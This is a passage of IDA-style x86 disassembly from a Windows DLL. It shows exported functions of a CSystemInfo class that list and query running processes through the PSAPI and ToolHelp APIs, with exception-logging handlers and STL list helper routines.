		pop	ecx

loc_6AF4EDBD:				; CODE XREF: Ordinal1354+1D8j
		mov	[ebp+var_154], ebx
		lea	ecx, [ebp+var_18C]
		jmp	loc_6AF4EF80
; ---------------------------------------------------------------------------

loc_6AF4EDCE:				; CODE XREF: Ordinal1354+1FEj
		mov	esi, [ebp+var_158]
		shr	esi, 2
		cmp	esi, [ebp+var_150]
		mov	[ebp+var_15C], esi
		jnz	short loc_6AF4EDED
		add	esi, esi
		mov	[ebp+var_15C], esi

loc_6AF4EDED:				; CODE XREF: Ordinal1354+239j
		or	[ebp+var_4], 0FFFFFFFFh
		lea	ecx, [ebp+var_18C]
		call	Ordinal752
		jmp	loc_6AF4EC0E
; ---------------------------------------------------------------------------

loc_6AF4EE01:				; CODE XREF: Ordinal1354+6Aj
		cmp	[ebp+var_154], ebx
		jz	loc_6AF4EF85
		push	offset aCsysteminfo_13 ; "CSystemInfo::GetProcessListPSAPI()"
		lea	ecx, [ebp+var_1AC]
		call	Ordinal751
		mov	[ebp+var_4], 3
		mov	byte ptr [ebp+var_4], 4
		mov	[ebp+var_150], ebx

loc_6AF4EE2E:				; CODE XREF: Ordinal1354+301j
		cmp	[ebp+var_150], esi
		jnb	loc_6AF4EF65
		mov	eax, [ebp+Dst]
		mov	ecx, [ebp+var_150]
		lea	edi, [eax+ecx*4]
		cmp	[edi], ebx
		jz	short loc_6AF4EEA5
		lea	ecx, [ebp+var_148]
		call	Ordinal1333
		mov	ecx, [ebp+var_160]
		lea	eax, [ebp+var_148]
		push	eax		; int
		push	dword ptr [edi]	; hObject
		mov	byte ptr [ebp+var_4], 5
		call	Ordinal1352
		test	eax, eax
		jnz	short loc_6AF4EE87
		push	offset aCsysteminfo_15 ; "CSystemInfo::GetProcessListPSAPI() : Ge"...
		call	sub_6AF3102E
		pop	ecx
		mov	[ebp+var_154], ebx
		jmp	short loc_6AF4EE96
; ---------------------------------------------------------------------------

loc_6AF4EE87:				; CODE XREF: Ordinal1354+2C8j
		mov	ecx, [ebp+arg_0]
		lea	eax, [ebp+var_148]
		push	eax
		call	sub_6AF4EB6A

loc_6AF4EE96:				; CODE XREF: Ordinal1354+2DBj
		lea	ecx, [ebp+var_148]
		mov	byte ptr [ebp+var_4], 4
		call	Ordinal1334

loc_6AF4EEA5:				; CODE XREF: Ordinal1354+2A1j
		inc	[ebp+var_150]
		jmp	short loc_6AF4EE2E
; ---------------------------------------------------------------------------

loc_6AF4EEAD:				; DATA XREF: .rdata:6AF642E4o
		push	13h
		lea	ecx, [ebp+var_1AC]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp+var_1AC]
		call	Ordinal762
		mov	ecx, [ebp+var_168]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp+var_1AC]
		call	Ordinal764
		lea	ecx, [ebp+var_1AC]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF4EF63
		retn
; ---------------------------------------------------------------------------

loc_6AF4EEFF:				; DATA XREF: .rdata:6AF642F4o
		push	15h
		lea	ecx, [ebp+var_1AC]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp+var_1AC]
		call	Ordinal762
		mov	eax, [ebp+var_16C]
		push	dword ptr [eax]
		lea	eax, [ebp+Src]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp+Src]
		push	eax		; Src
		lea	ecx, [ebp+var_1AC]
		call	Ordinal764
		lea	ecx, [ebp+var_1AC]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF4EF63
		retn
; ---------------------------------------------------------------------------

loc_6AF4EF63:				; DATA XREF: Ordinal1354+34Fo
					; Ordinal1354+3B3o
		xor	ebx, ebx

loc_6AF4EF65:				; CODE XREF: Ordinal1354+28Aj
		lea	ecx, [ebp+var_1AC]
		call	Ordinal753
		test	eax, eax
		jz	short loc_6AF4EF7A
		mov	[ebp+var_154], ebx

loc_6AF4EF7A:				; CODE XREF: Ordinal1354+3C8j
		lea	ecx, [ebp+var_1AC]

loc_6AF4EF80:				; CODE XREF: Ordinal1354+21Fj
		call	Ordinal752

loc_6AF4EF85:				; CODE XREF: Ordinal1354+25Dj
		cmp	[ebp+Dst], ebx
		jz	short loc_6AF4EF99
		push	[ebp+Dst]	; void *
		call	??_V@YAXPAX@Z	; operator delete[](void *)
		pop	ecx

loc_6AF4EF99:				; CODE XREF: Ordinal1354+3E1j
		mov	eax, [ebp+var_154]

loc_6AF4EF9F:				; CODE XREF: Ordinal1354+38j
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	4
Ordinal1354	endp ; sp-analysis failed

; Exported entry 1357.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1357(char Args, int)
		public Ordinal1357
Ordinal1357	proc near		; CODE XREF: Ordinal1351+4Ep
					; Ordinal1355+19p
					; DATA XREF: ...

var_2A4		= dword	ptr -2A4h
var_2A0		= dword	ptr -2A0h
var_29C		= byte ptr -29Ch
var_27C		= dword	ptr -27Ch
hObject		= dword	ptr -278h
var_274		= dword	ptr -274h
var_270		= byte ptr -270h
var_26C		= dword	ptr -26Ch
var_268		= dword	ptr -268h
String1		= byte ptr -260h
Dst		= dword	ptr -14Ch
var_144		= dword	ptr -144h
var_134		= dword	ptr -134h
String2		= byte ptr -128h
Src		= byte ptr -24h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
Args		= byte ptr  8
arg_4		= dword	ptr  0Ch

		mov	eax, offset unknown_libname_117	; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 298h
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		push	edi
		mov	edi, ecx
		mov	[ebp+var_14], eax
		mov	eax, [edi+84h]
		xor	ebx, ebx
		cmp	eax, ebx
		mov	[ebp+var_10], esp
		jz	loc_6AF4F2A6
		cmp	[edi+0ACh], ebx
		jz	loc_6AF4F2A6
		cmp	[edi+0B0h], ebx
		jz	loc_6AF4F2A6
		push	ebx
		push	2
		call	eax
		cmp	eax, 0FFFFFFFFh
		mov	[ebp+hObject], eax
		jnz	short loc_6AF4F02C
		call	ds:GetLastError
		push	eax
		push	dword ptr [ebp+Args] ; Args
		push	offset aCsysteminfo_16 ; "CSystemInfo::GetProcessListToolHelp()	:"...
		call	sub_6AF3102E
		add	esp, 0Ch
		jmp	loc_6AF4F2B1
; ---------------------------------------------------------------------------

loc_6AF4F02C:				; CODE XREF: Ordinal1357+56j
		mov	esi, 128h
		push	esi		; Size
		lea	eax, [ebp+Dst]
		push	ebx		; Val
		push	eax		; Dst
		call	memset
		add	esp, 0Ch
		lea	eax, [ebp+Dst]
		push	eax
		push	[ebp+hObject]
		mov	[ebp+Dst], esi
		call	dword ptr [edi+0ACh]
		test	eax, eax
		jnz	short loc_6AF4F087
		call	ds:GetLastError
		push	eax
		push	dword ptr [ebp+Args] ; Args
		push	offset aCsysteminfo_17 ; "CSystemInfo::GetProcessListToolHelp()	:"...
		call	sub_6AF3102E
		add	esp, 0Ch
		push	[ebp+hObject]	; hObject
		call	ds:CloseHandle
		jmp	loc_6AF4F2B1
; ---------------------------------------------------------------------------

loc_6AF4F087:				; CODE XREF: Ordinal1357+A5j
		push	offset aCsysteminfo_18 ; "CSystemInfo::GetProcessListToolHelp()"
		lea	ecx, [ebp+var_29C]
		mov	[ebp+var_274], 1
		mov	[ebp+var_27C], ebx
		call	Ordinal751
		mov	[ebp+var_4], ebx
		mov	byte ptr [ebp+var_4], 1

loc_6AF4F0AE:				; CODE XREF: Ordinal1357+1B4j
		cmp	[ebp+var_144], ebx
		jz	loc_6AF4F157
		mov	esi, dword ptr [ebp+Args]
		cmp	[ebp+var_144], esi
		jz	short loc_6AF4F0CD
		cmp	esi, ebx
		jnz	loc_6AF4F157

loc_6AF4F0CD:				; CODE XREF: Ordinal1357+10Bj
		lea	ecx, [ebp+var_270]
		mov	[ebp+var_27C], 1
		call	Ordinal1333
		mov	eax, [ebp+var_144]
		mov	[ebp+var_26C], eax
		mov	eax, [ebp+var_134]
		mov	[ebp+var_268], eax
		lea	eax, [ebp+String2]
		push	eax		; lpString2
		lea	eax, [ebp+String1]
		push	eax		; lpString1
		mov	byte ptr [ebp+var_4], 2
		call	ds:lstrcpyA
		lea	eax, [ebp+var_270]
		push	eax
		mov	ecx, edi
		call	Ordinal1356
		test	eax, eax
		jnz	short loc_6AF4F139
		push	esi		; Args
		push	offset aCsysteminfo_19 ; "CSystemInfo::GetProcessListToolHelp()	:"...
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	[ebp+var_274], ebx
		jmp	short loc_6AF4F148
; ---------------------------------------------------------------------------

loc_6AF4F139:				; CODE XREF: Ordinal1357+16Aj
		mov	ecx, [ebp+arg_4]
		lea	eax, [ebp+var_270]
		push	eax
		call	sub_6AF4EB6A

loc_6AF4F148:				; CODE XREF: Ordinal1357+17Fj
		lea	ecx, [ebp+var_270]
		mov	byte ptr [ebp+var_4], 1
		call	Ordinal1334

loc_6AF4F157:				; CODE XREF: Ordinal1357+FCj
					; Ordinal1357+10Fj
		lea	eax, [ebp+Dst]
		push	eax
		push	[ebp+hObject]
		call	dword ptr [edi+0B0h]
		cmp	eax, ebx
		jnz	loc_6AF4F0AE
		call	ds:GetLastError
		cmp	eax, 12h
		jz	loc_6AF4F255
		push	eax
		push	dword ptr [ebp+Args] ; Args
		push	offset aCsysteminfo_20 ; "CSystemInfo::GetProcessListToolHelp()	:"...
		call	sub_6AF3102E
		add	esp, 0Ch
		mov	[ebp+var_274], ebx
		jmp	loc_6AF4F255
; ---------------------------------------------------------------------------

loc_6AF4F19D:				; DATA XREF: .rdata:6AF64368o
		push	13h
		lea	ecx, [ebp+var_29C]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp+var_29C]
		call	Ordinal762
		mov	ecx, [ebp+var_2A4]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp+var_29C]
		call	Ordinal764
		lea	ecx, [ebp+var_29C]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF4F253
		retn
; ---------------------------------------------------------------------------

loc_6AF4F1EF:				; DATA XREF: .rdata:6AF64378o
		push	15h
		lea	ecx, [ebp+var_29C]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp+var_29C]
		call	Ordinal762
		mov	eax, [ebp+var_2A0]
		push	dword ptr [eax]
		lea	eax, [ebp+Src]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp+Src]
		push	eax		; Src
		lea	ecx, [ebp+var_29C]
		call	Ordinal764
		lea	ecx, [ebp+var_29C]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF4F253
		retn
; ---------------------------------------------------------------------------

loc_6AF4F253:				; DATA XREF: Ordinal1357+231o
					; Ordinal1357+295o
		xor	ebx, ebx

loc_6AF4F255:				; CODE XREF: Ordinal1357+1C3j
					; Ordinal1357+1E0j
		lea	ecx, [ebp+var_29C]
		call	Ordinal753
		test	eax, eax
		jz	short loc_6AF4F26A
		mov	[ebp+var_274], ebx

loc_6AF4F26A:				; CODE XREF: Ordinal1357+2AAj
		cmp	[ebp+var_27C], ebx
		jnz	short loc_6AF4F287
		push	dword ptr [ebp+Args] ; Args
		push	offset aCsysteminfo_21 ; "CSystemInfo::GetProcessListToolHelp()	:"...
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	[ebp+var_274], ebx

loc_6AF4F287:				; CODE XREF: Ordinal1357+2B8j
		push	[ebp+hObject]	; hObject
		call	ds:CloseHandle
		lea	ecx, [ebp+var_29C]
		call	Ordinal752
		mov	eax, [ebp+var_274]
		jmp	short loc_6AF4F2B3
; ---------------------------------------------------------------------------

loc_6AF4F2A6:				; CODE XREF: Ordinal1357+2Aj
					; Ordinal1357+36j ...
		push	offset aCsysteminfo_22 ; "CSystemInfo::GetProcessListToolHelp()	:"...
		call	sub_6AF3102E
		pop	ecx

loc_6AF4F2B1:				; CODE XREF: Ordinal1357+6Fj
					; Ordinal1357+CAj
		xor	eax, eax

loc_6AF4F2B3:				; CODE XREF: Ordinal1357+2ECj
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	8
Ordinal1357	endp ; sp-analysis failed

; Exported entry 1351.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal1351
Ordinal1351	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ebx
		push	esi
		push	edi
		mov	esi, ecx
		xor	ebx, ebx
		xor	edi, edi
		cmp	[esi+78h], ebx
		jz	short loc_6AF4F30C
		push	[ebp+arg_0]
		call	Ordinal1354
		mov	edi, eax
		cmp	edi, ebx
		jnz	short loc_6AF4F343
		mov	ecx, [ebp+arg_0]
		call	sub_6AF4D3DC
		test	eax, eax
		jnz	short loc_6AF4F343
		push	offset aCsysteminfo_23 ; "CSystemInfo::GetProcessList()	: GetProc"...
		call	sub_6AF3102E
		cmp	[esi+0B4h], ebx
		pop	ecx
		jz	short loc_6AF4F343
		jmp	short loc_6AF4F314
; ---------------------------------------------------------------------------

loc_6AF4F30C:				; CODE XREF: Ordinal1351+Fj
		cmp	[esi+0B4h], ebx
		jz	short loc_6AF4F338

loc_6AF4F314:				; CODE XREF: Ordinal1351+3Ej
		push	[ebp+arg_0]	; int
		mov	ecx, esi
		push	ebx		; Args
		call	Ordinal1357
		mov	edi, eax
		cmp	edi, ebx
		jnz	short loc_6AF4F343
		mov	ecx, [ebp+arg_0]
		call	sub_6AF4D3DC
		test	eax, eax
		jnz	short loc_6AF4F343
		push	offset aCsysteminfo_24 ; "CSystemInfo::GetProcessList()	: GetProc"...
		jmp	short loc_6AF4F33D
; ---------------------------------------------------------------------------

loc_6AF4F338:				; CODE XREF: Ordinal1351+46j
		push	offset aCsysteminfo_25 ; "CSystemInfo::GetProcessList()	: m_bPSAP"...

loc_6AF4F33D:				; CODE XREF: Ordinal1351+6Aj
		call	sub_6AF3102E
		pop	ecx

loc_6AF4F343:				; CODE XREF: Ordinal1351+1Dj
					; Ordinal1351+29j ...
		mov	eax, edi
		pop	edi
		pop	esi
		pop	ebx
		pop	ebp
		retn	4
Ordinal1351	endp

; Exported entry 1355.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1355(char Args, int)
		public Ordinal1355
Ordinal1355	proc near		; CODE XREF: Ordinal1350+45p
					; DATA XREF: .rdata:off_6AF66098o

var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
Args		= byte ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 10h
		push	esi
		lea	eax, [ebp+var_10]
		push	eax		; int
		push	dword ptr [ebp+Args] ; Args
		xor	esi, esi
		mov	[ebp+var_C], esi
		mov	[ebp+var_8], esi
		mov	[ebp+var_4], esi
		call	Ordinal1357
		test	eax, eax
		jnz	short loc_6AF4F37F
		push	dword ptr [ebp+Args] ; Args
		push	offset aCsysteminfo_26 ; "CSystemInfo::GetProcessInfoToolHelp()	:"...
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		jmp	short loc_6AF4F38D
; ---------------------------------------------------------------------------

loc_6AF4F37F:				; CODE XREF: Ordinal1355+20j
		push	[ebp+var_C]
		mov	ecx, [ebp+arg_4]
		call	Ordinal1336
		xor	esi, esi
		inc	esi

loc_6AF4F38D:				; CODE XREF: Ordinal1355+31j
		lea	ecx, [ebp+var_10]
		call	sub_6AF4D954
		mov	eax, esi
		pop	esi
		leave
		retn	8
Ordinal1355	endp

; Exported entry 1350.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1350(DWORD Args,	int)
		public Ordinal1350
Ordinal1350	proc near		; DATA XREF: .rdata:off_6AF66098o

Args		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	esi
		push	edi
		mov	esi, ecx
		xor	edi, edi
		cmp	[esi+78h], edi
		jz	short loc_6AF4F3D0
		push	[ebp+arg_4]	; int
		push	[ebp+Args]	; hObject
		call	Ordinal1352
		mov	edi, eax
		test	edi, edi
		jnz	short loc_6AF4F3FE
		push	offset aCsysteminfo_27 ; "CSystemInfo::GetProcessInfo()	: GetProc"...
		call	sub_6AF3102E
		cmp	[esi+0B4h], edi
		pop	ecx
		jz	short loc_6AF4F3FE
		jmp	short loc_6AF4F3D9
; ---------------------------------------------------------------------------

loc_6AF4F3D0:				; CODE XREF: Ordinal1350+Cj
		cmp	dword ptr [esi+0B4h], 0
		jz	short loc_6AF4F3F3

loc_6AF4F3D9:				; CODE XREF: Ordinal1350+32j
		push	[ebp+arg_4]	; int
		mov	ecx, esi
		push	[ebp+Args]	; Args
		call	Ordinal1355
		mov	edi, eax
		test	edi, edi
		jnz	short loc_6AF4F3FE
		push	offset aCsysteminfo_28 ; "CSystemInfo::GetProcessInfo()	: GetProc"...
		jmp	short loc_6AF4F3F8
; ---------------------------------------------------------------------------

loc_6AF4F3F3:				; CODE XREF: Ordinal1350+3Bj
		push	offset aCsysteminfo_29 ; "CSystemInfo::GetProcessInfo()	: m_bPSAP"...

loc_6AF4F3F8:				; CODE XREF: Ordinal1350+55j
		call	sub_6AF3102E
		pop	ecx

loc_6AF4F3FE:				; CODE XREF: Ordinal1350+1Dj
					; Ordinal1350+30j ...
		mov	eax, edi
		pop	edi
		pop	esi
		pop	ebp
		retn	8
Ordinal1350	endp

; Exported entry 1358.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1358
Ordinal1358	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	eax, ecx
		mov	dword ptr [eax], offset	off_6AF604B8
		retn
Ordinal1358	endp

; Exported entry 1359.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1359
Ordinal1359	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	dword ptr [ecx], offset	off_6AF604B8
		retn
Ordinal1359	endp

; Exported entry 1364.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal1364
Ordinal1364	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+14h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		mov	esi, [esi+4]
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		leave
		retn
Ordinal1364	endp

; Exported entry 1365.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal1365
Ordinal1365	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+14h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		mov	eax, [ebp+arg_0]
		lea	ecx, [ebp+var_C]
		mov	[esi+4], eax
		call	Ordinal1230
		pop	esi
		leave
		retn	4
Ordinal1365	endp

; Exported entry 1367.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1367
Ordinal1367	proc near		; DATA XREF: .rdata:6AF604E4o
					; .rdata:6AF60554o ...

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		push	esi
		mov	esi, [esp+4+arg_4]
		mov	ecx, [esi]
		push	[esp+4+arg_0]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		mov	eax, [esi+4]
		test	eax, eax
		jz	short loc_6AF4F489
		push	eax		; hEvent
		call	ds:SetEvent

loc_6AF4F489:				; CODE XREF: Ordinal1367+15j
		cmp	dword ptr [esi+8], 0
		jz	short loc_6AF4F49E
		mov	ecx, [esi]
		test	ecx, ecx
		jz	short loc_6AF4F49B
		mov	eax, [ecx]
		push	1
		call	dword ptr [eax]

loc_6AF4F49B:				; CODE XREF: Ordinal1367+28j
		and	dword ptr [esi], 0

loc_6AF4F49E:				; CODE XREF: Ordinal1367+22j
		pop	esi
		retn	8
Ordinal1367	endp

; [0000001D BYTES: COLLAPSED FUNCTION unknown_libname_12. PRESS	KEYPAD "+" TO EXPAND]
; Exported entry 1363.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal1363
Ordinal1363	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+14h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		mov	esi, [esi+10h]
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		leave
		retn
Ordinal1363	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF4F4E8	proc near		; CODE XREF: sub_6AF4F636+3p
		push	14h		; Size
		call	??2@YAPAXI@Z	; operator new(uint)
		test	eax, eax
		pop	ecx
		jz	short loc_6AF4F4F6
		mov	[eax], eax

loc_6AF4F4F6:				; CODE XREF: sub_6AF4F4E8+Aj
		lea	ecx, [eax+4]
		test	ecx, ecx
		jz	short locret_6AF4F4FF
		mov	[ecx], eax

locret_6AF4F4FF:			; CODE XREF: sub_6AF4F4E8+13j
		retn
sub_6AF4F4E8	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF4F500	proc near		; CODE XREF: Ordinal1361-48p
		push	esi
		mov	esi, ecx
		mov	eax, [esi+4]
		mov	ecx, [eax]
		mov	[eax], eax
		mov	eax, [esi+4]
		mov	[eax+4], eax
		and	dword ptr [esi+8], 0
		cmp	ecx, [esi+4]
		jz	short loc_6AF4F52B
		push	edi

loc_6AF4F51A:				; CODE XREF: sub_6AF4F500+28j
		mov	edi, [ecx]
		push	ecx		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		cmp	edi, [esi+4]
		pop	ecx
		mov	ecx, edi
		jnz	short loc_6AF4F51A
		pop	edi

loc_6AF4F52B:				; CODE XREF: sub_6AF4F500+17j
		pop	esi
		retn
sub_6AF4F500	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF4F52D	proc near		; CODE XREF: sub_6AF4F5BD+11p

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8
arg_8		= dword	ptr  0Ch

		push	14h		; Size
		call	??2@YAPAXI@Z	; operator new(uint)
		test	eax, eax
		pop	ecx
		jz	short locret_6AF4F554
		mov	ecx, [esp+arg_0]
		push	esi
		mov	esi, [esp+4+arg_8]
		push	edi
		mov	[eax], ecx
		mov	ecx, [esp+8+arg_4]
		mov	[eax+4], ecx
		lea	edi, [eax+8]
		movsd
		movsd
		movsd
		pop	edi
		pop	esi

locret_6AF4F554:			; CODE XREF: sub_6AF4F52D+Aj
		retn	0Ch
sub_6AF4F52D	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF4F557	proc near		; CODE XREF: sub_6AF4F5BD+1Cp

var_50		= dword	ptr -50h
var_28		= byte ptr -28h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		mov	eax, offset unknown_libname_118	; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 44h
		mov	eax, [ecx+8]
		mov	edx, [ebp+arg_0]
		push	esi
		mov	esi, 15555555h
		sub	esi, eax
		cmp	esi, edx
		pop	esi
		jnb	short loc_6AF4F5AA
		push	offset aListTTooLong ; "list<T>	too long"
		lea	ecx, [ebp+var_28]
		call	ds:??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@PBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string<char,std::char_traits<char>,std::allocator<char>>(char	const *)
		and	[ebp+var_4], 0
		lea	eax, [ebp+var_28]
		push	eax
		lea	ecx, [ebp+var_50]
		call	sub_6AF3136A
		push	offset dword_6AF61E98
		lea	eax, [ebp+var_50]
		push	eax
		mov	[ebp+var_50], offset off_6AF54898
		call	_CxxThrowException
; ---------------------------------------------------------------------------

loc_6AF4F5AA:				; CODE XREF: sub_6AF4F557+1Ej
		add	eax, edx
		mov	[ecx+8], eax
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		leave
		retn	4
sub_6AF4F557	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF4F5BD	proc near		; CODE XREF: Ordinal1362+8Dp

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		push	ebx
		push	esi
		push	edi
		push	[esp+0Ch+arg_4]
		mov	edi, [esp+10h+arg_0]
		push	dword ptr [edi+4]
		mov	ebx, ecx
		push	edi
		call	sub_6AF4F52D
		push	1
		mov	ecx, ebx
		mov	esi, eax
		call	sub_6AF4F557
		mov	[edi+4], esi
		mov	eax, [esi+4]
		pop	edi
		mov	[eax], esi
		pop	esi
		pop	ebx
		retn	8
sub_6AF4F5BD	endp


; =============== S U B	R O U T	I N E =======================================


; int __stdcall	sub_6AF4F5EC(int, void *)
sub_6AF4F5EC	proc near		; CODE XREF: Ordinal1366+3Bp

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		mov	eax, [esp+arg_4]
		push	esi
		mov	esi, ecx
		cmp	eax, [esi+4]
		push	edi
		mov	edi, [eax]
		jz	short loc_6AF4F614
		mov	ecx, [eax+4]
		mov	edx, [eax]
		mov	[ecx], edx
		mov	ecx, [eax]
		mov	edx, [eax+4]
		push	eax		; void *
		mov	[ecx+4], edx
		call	??3@YAXPAX@Z	; operator delete(void *)
		dec	dword ptr [esi+8]
		pop	ecx

loc_6AF4F614:				; CODE XREF: sub_6AF4F5EC+Dj
		mov	eax, [esp+8+arg_0]
		mov	[eax], edi
		pop	edi
		pop	esi
		retn	8
sub_6AF4F5EC	endp

; ---------------------------------------------------------------------------
; START	OF FUNCTION CHUNK FOR Ordinal1361

loc_6AF4F61F:				; CODE XREF: Ordinal1361+15j
		push	esi
		mov	esi, ecx
		call	sub_6AF4F500
		push	dword ptr [esi+4] ; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		and	dword ptr [esi+4], 0
		pop	ecx
		pop	esi
		retn
; END OF FUNCTION CHUNK	FOR Ordinal1361

; =============== S U B	R O U T	I N E =======================================


sub_6AF4F636	proc near		; CODE XREF: Ordinal1360+Cp
		push	esi
		mov	esi, ecx
		call	sub_6AF4F4E8
		and	dword ptr [esi+8], 0
		mov	[esi+4], eax
		mov	eax, esi
		pop	esi
		retn
sub_6AF4F636	endp

; Exported entry 1360.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1360
Ordinal1360	proc near		; CODE XREF: Ordinal1368+Ep
					; Ordinal1408+4p
					; DATA XREF: ...
		push	esi
		mov	esi, ecx
		lea	ecx, [esi+8]
		mov	dword ptr [esi], offset	off_6AF604D4
		call	sub_6AF4F636
		lea	ecx, [esi+14h]
		call	Ordinal1278
		and	dword ptr [esi+4], 0
		mov	eax, esi
		pop	esi
		retn
Ordinal1360	endp

; Exported entry 1361.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1361
Ordinal1361	proc near		; CODE XREF: sub_6AF4F863+3p
					; Ordinal1369+1Dp ...

; FUNCTION CHUNK AT 6AF4F61F SIZE 00000017 BYTES

		push	esi
		mov	esi, ecx
		lea	ecx, [esi+14h]
		mov	dword ptr [esi], offset	off_6AF604D4
		call	Ordinal1279
		lea	ecx, [esi+8]
		pop	esi
		jmp	loc_6AF4F61F
Ordinal1361	endp

; Exported entry 1362.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal1362
Ordinal1362	proc near		; CODE XREF: Ordinal1371+2Bp
					; Ordinal1419+1Ap
					; DATA XREF: ...

var_68		= dword	ptr -68h
var_64		= dword	ptr -64h
var_60		= byte ptr -60h
var_54		= byte ptr -54h
Dst		= dword	ptr -34h
var_30		= dword	ptr -30h
var_2C		= dword	ptr -2Ch
var_28		= dword	ptr -28h
Src		= byte ptr -24h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		mov	eax, offset unknown_libname_119	; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 5Ch
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		push	edi
